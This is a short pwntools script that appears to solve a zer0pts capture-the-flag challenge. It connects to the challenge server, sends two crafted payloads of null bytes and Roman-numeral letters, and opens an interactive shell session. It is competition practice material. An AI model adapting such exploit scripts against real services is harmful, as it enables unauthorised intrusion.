from pwn import *

# p = process('./chall')
p = connect('pwn1.ctf.zer0pts.com', 9000)

payload = b'\x00'*6
payload += b'M'*5
payload += b'C'*1
payload += b'X'*6
payload += b'I'*4
p.sendlineafter(b'ind: ', payload)

payload = b'M'*4
payload += b'C'*8
payload += b'X'*5
payload += b'I'*4
p.sendlineafter(b'val: ', payload)
print(p.recvline())
p.interactive()
